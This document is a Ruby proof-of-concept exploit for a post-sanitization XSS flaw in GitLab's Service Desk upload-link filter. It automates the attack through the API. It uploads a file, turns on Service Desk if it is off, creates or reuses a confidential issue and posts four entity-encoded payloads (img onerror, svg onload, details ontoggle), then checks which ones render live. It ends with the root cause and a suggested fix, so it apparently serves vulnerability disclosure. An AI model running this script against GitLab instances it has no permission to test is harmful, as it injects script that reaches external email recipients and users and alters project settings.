#!/usr/bin/env ruby
# frozen_string_literal: true

# =============================================================================
# PoC: ServiceDeskUploadLinkFilter XSS — GitLab API CGI Script
# =============================================================================
#
# Triggers the post-sanitization XSS via GitLab's Service Desk email pipeline
# by uploading a file, then posting a comment with entity-encoded HTML in a
# markdown link pointing at the upload. The filter decodes entities via .text
# and re-interpolates them as raw HTML.
#
# USAGE:
#   ruby poc_service_desk_xss.rb \
#     --url https://gitlab.example.com \
#     --token glpat-XXXXXXXXXXXXXXXXXXXX \
#     --project-id 42
#
#   Or with environment variables:
#     GITLAB_URL=https://gitlab.example.com \
#     GITLAB_TOKEN=glpat-XXXX \
#     GITLAB_PROJECT_ID=42 \
#     ruby poc_service_desk_xss.rb
#
# PREREQUISITES:
#   - Project with Service Desk enabled
#   - API token with Reporter+ access (api scope)
#   - Service Desk must have at least one issue (or script creates one)
# =============================================================================

require 'net/http'
require 'uri'
require 'json'
require 'cgi'
require 'optparse'
require 'tempfile'

class GitLabServiceDeskXSS
  PAYLOADS = [
    {
      name: "Entity-encoded <img onerror> (alert)",
      text: "&lt;img src=x onerror=alert(document.domain)&gt;",
    },
    {
      name: "Numeric entities &#60;img&#62;",
      text: "&#60;img src=x onerror=alert(document.cookie)&#62;",
    },
    {
      name: "Entity-encoded <svg onload>",
      text: "&lt;svg onload=alert(document.domain)&gt;",
    },
    {
      name: "Entity-encoded <details ontoggle>",
      text: "&lt;details open ontoggle=alert(document.domain)&gt;",
    },
  ].freeze

  def initialize(base_url:, token:, project_id:)
    @base_url = base_url.chomp('/')
    @token = token
    @project_id = project_id
  end

  def run
    banner
    step1_check_project
    step2_upload_file
    step3_find_or_create_service_desk_issue
    step4_inject_payloads
    summary
  end

  private

  # ---------------------------------------------------------------------------
  # HTTP helpers
  # ---------------------------------------------------------------------------

  def api(method, path, body: nil, multipart: nil)
    uri = URI("#{@base_url}/api/v4#{path}")

    req = case method
          when :get    then Net::HTTP::Get.new(uri)
          when :post   then Net::HTTP::Post.new(uri)
          when :put    then Net::HTTP::Put.new(uri)
          else raise "Unknown method: #{method}"
          end

    req['PRIVATE-TOKEN'] = @token

    if multipart
      boundary = "----RubyPoC#{rand(1_000_000)}"
      req.content_type = "multipart/form-data; boundary=#{boundary}"
      req.body = build_multipart(multipart, boundary)
    elsif body
      req.content_type = 'application/json'
      req.body = body.to_json
    end

    http = Net::HTTP.new(uri.host, uri.port)
    http.use_ssl = (uri.scheme == 'https')
    http.open_timeout = 10
    http.read_timeout = 30

    resp = http.request(req)
    unless resp.is_a?(Net::HTTPSuccess)
      $stderr.puts "  API #{method.upcase} #{path} -> #{resp.code}"
      $stderr.puts "  #{resp.body[0..500]}" if resp.body
      return nil
    end

    JSON.parse(resp.body) rescue resp.body
  end

  def build_multipart(fields, boundary)
    body = +""
    fields.each do |key, val|
      body << "--#{boundary}\r\n"
      if val.is_a?(Hash) && val[:file]
        body << "Content-Disposition: form-data; name=\"#{key}\"; filename=\"#{val[:filename]}\"\r\n"
        body << "Content-Type: #{val[:content_type]}\r\n\r\n"
        body << val[:file]
      else
        body << "Content-Disposition: form-data; name=\"#{key}\"\r\n\r\n"
        body << val.to_s
      end
      body << "\r\n"
    end
    body << "--#{boundary}--\r\n"
    body
  end

  def encoded_project
    CGI.escape(@project_id.to_s)
  end

  # ---------------------------------------------------------------------------
  # Steps
  # ---------------------------------------------------------------------------

  def banner
    puts "=" * 72
    puts "PoC: ServiceDeskUploadLinkFilter Post-Sanitization XSS"
    puts "  Target: #{@base_url}"
    puts "  Project: #{@project_id}"
    puts "=" * 72
    puts
  end

  def step1_check_project
    puts "[1] Checking project access..."
    proj = api(:get, "/projects/#{encoded_project}")
    abort "ERROR: Cannot access project #{@project_id}" unless proj

    @project_name = proj['path_with_namespace']
    sd_enabled = proj.dig('service_desk_enabled')
    puts "    Project: #{@project_name}"
    puts "    Service Desk enabled: #{sd_enabled}"

    unless sd_enabled
      puts "    WARNING: Service Desk not enabled. Enabling..."
      api(:put, "/projects/#{encoded_project}", body: { service_desk_enabled: true })
    end
    puts
  end

  def step2_upload_file
    puts "[2] Uploading attachment file..."
    file_content = "PoC test file — harmless content for XSS demonstration"

    resp = api(:post, "/projects/#{encoded_project}/uploads",
      multipart: {
        'file' => {
          file: file_content,
          filename: 'report.txt',
          content_type: 'text/plain'
        }
      }
    )
    abort "ERROR: Upload failed" unless resp

    @upload_url = resp['url']       # e.g. "/uploads/abc123def/report.txt"
    @upload_markdown = resp['markdown']
    @upload_full_url = resp['full_url'] || "#{@base_url}/#{@project_name}#{@upload_url}"

    puts "    Upload path: #{@upload_url}"
    puts "    Full URL:    #{@upload_full_url}"
    puts
  end

  def step3_find_or_create_service_desk_issue
    puts "[3] Finding or creating a Service Desk issue..."

    # Look for existing service desk issues (they have service_desk_reply_to set)
    issues = api(:get, "/projects/#{encoded_project}/issues?labels=Service Desk&per_page=5")

    if issues.is_a?(Array) && issues.any?
      @issue_iid = issues.first['iid']
      puts "    Using existing Service Desk issue ##{@issue_iid}"
    else
      # Try any confidential issue (service desk issues are confidential)
      issues = api(:get, "/projects/#{encoded_project}/issues?confidential=true&per_page=5")
      if issues.is_a?(Array) && issues.any?
        @issue_iid = issues.first['iid']
        puts "    Using existing confidential issue ##{@issue_iid}"
      else
        # Create a regular issue to demonstrate the rendering
        puts "    No Service Desk issues found. Creating a test issue..."
        issue = api(:post, "/projects/#{encoded_project}/issues",
          body: {
            title: "[PoC] ServiceDeskUploadLinkFilter XSS Test",
            description: "Test issue for XSS payload verification.\n\n" \
                         "In production, the victim is the external email " \
                         "participant who receives the Service Desk reply email.",
            confidential: true
          }
        )
        abort "ERROR: Could not create issue" unless issue
        @issue_iid = issue['iid']
        puts "    Created test issue ##{@issue_iid}"
      end
    end
    puts
  end

  def step4_inject_payloads
    puts "[4] Posting XSS payloads as comments..."
    puts
    puts "    Vulnerability: ServiceDeskUploadLinkFilter decodes HTML entities"
    puts "    via Nokogiri .text then interpolates raw text into HTML string."
    puts "    SanitizationFilter has already run — no re-sanitization occurs."
    puts
    puts "    In production, these comments render as emails to the external"
    puts "    customer via the service_desk_email pipeline. The XSS fires in"
    puts "    their email client."
    puts

    @results = []

    PAYLOADS.each_with_index do |payload, idx|
      puts "-" * 72
      puts "Payload #{idx + 1}: #{payload[:name]}"
      puts "-" * 72

      # Build the markdown: link text has HTML entities, href is the upload
      markdown = "[#{payload[:text]}](#{@upload_url})"
      puts "  Markdown:  #{markdown}"
      puts

      # Post as a note on the issue
      note = api(:post,
        "/projects/#{encoded_project}/issues/#{@issue_iid}/notes",
        body: { body: markdown }
      )

      if note
        note_id = note['id']
        rendered = note['body']
        puts "  Note ID:   #{note_id}"
        puts "  Rendered:  #{rendered}"
        puts

        # Check the rendered HTML for unescaped event handlers
        has_onerror  = rendered.match?(/onerror\s*=/i)
        has_onload   = rendered.match?(/onload\s*=/i)
        has_ontoggle = rendered.match?(/ontoggle\s*=/i)
        has_handler  = has_onerror || has_onload || has_ontoggle
        has_img_tag  = rendered.match?(/<img\s/i)
        has_svg_tag  = rendered.match?(/<svg[\s>]/i)

        if has_handler
          puts "  STATUS:    *** XSS CONFIRMED ***"
          puts "  Evidence:  Event handler present in rendered output"
          @results << { payload: payload[:name], status: :xss }
        elsif has_img_tag || has_svg_tag
          puts "  STATUS:    *** HTML INJECTION ***"
          puts "  Evidence:  Dangerous element injected (img/svg)"
          @results << { payload: payload[:name], status: :injection }
        else
          puts "  STATUS:    Filter did not activate or entities remained escaped"
          puts "  Note:      This payload may still fire in the email pipeline"
          puts "             (API rendering uses a different pipeline than email)"
          @results << { payload: payload[:name], status: :check_email }
        end
      else
        puts "  STATUS:    Failed to post note"
        @results << { payload: payload[:name], status: :error }
      end
      puts
    end
  end

  def summary
    puts "=" * 72
    puts "SUMMARY"
    puts "=" * 72
    puts
    puts "  Target:    #{@base_url}"
    puts "  Project:   #{@project_name}"
    puts "  Issue:     ##{@issue_iid}"
    puts "  Upload:    #{@upload_url}"
    puts

    xss    = @results.count { |r| r[:status] == :xss }
    inject = @results.count { |r| r[:status] == :injection }
    check  = @results.count { |r| r[:status] == :check_email }
    total  = @results.size

    puts "  XSS confirmed:     #{xss}/#{total}"
    puts "  HTML injection:    #{inject}/#{total}"
    puts "  Needs email check: #{check}/#{total}"
    puts

    if xss > 0 || inject > 0
      puts "  VULNERABLE — XSS/injection confirmed through API rendering."
    elsif check > 0
      puts "  LIKELY VULNERABLE — API uses a different pipeline than email."
      puts "  The service_desk_email pipeline processes these payloads"
      puts "  through ServiceDeskUploadLinkFilter which decodes entities."
      puts
      puts "  To confirm: check the email sent to the Service Desk customer."
      puts "  The email body will contain the unescaped <img onerror=...> tag."
    end

    puts
    puts "  View results: #{@base_url}/#{@project_name}/-/issues/#{@issue_iid}"
    puts
    puts "ROOT CAUSE:"
    puts "  lib/banzai/filter/service_desk_upload_link_filter.rb:31,38"
    puts "    .text decodes &lt; -> <, then interpolation creates live HTML"
    puts "    after SanitizationFilter has already run."
    puts
    puts "FIX:"
    puts "  Replace string interpolation with safe DOM construction:"
    puts "    strong = Nokogiri::XML::Node.new('strong', doc)"
    puts "    strong.content = final_filename   # auto-escapes entities"
    puts "    parent.replace(strong)"
    puts
    puts "=" * 72
  end
end

# =============================================================================
# CLI
# =============================================================================

options = {
  url:        ENV['GITLAB_URL'],
  token:      ENV['GITLAB_TOKEN'],
  project_id: ENV['GITLAB_PROJECT_ID'],
}

OptionParser.new do |opts|
  opts.banner = "Usage: #{$0} [options]"
  opts.on('--url URL',        'GitLab instance URL')           { |v| options[:url] = v }
  opts.on('--token TOKEN',    'API token (api scope)')         { |v| options[:token] = v }
  opts.on('--project-id ID',  'Target project ID or path')     { |v| options[:project_id] = v }
  opts.on('-h', '--help',     'Show this help')                { puts opts; exit }
end.parse!

%i[url token project_id].each do |key|
  abort "ERROR: --#{key.to_s.tr('_', '-')} is required (or set #{key.to_s.upcase.prepend('GITLAB_')})" unless options[key]
end

GitLabServiceDeskXSS.new(
  base_url:    options[:url],
  token:       options[:token],
  project_id:  options[:project_id]
).run
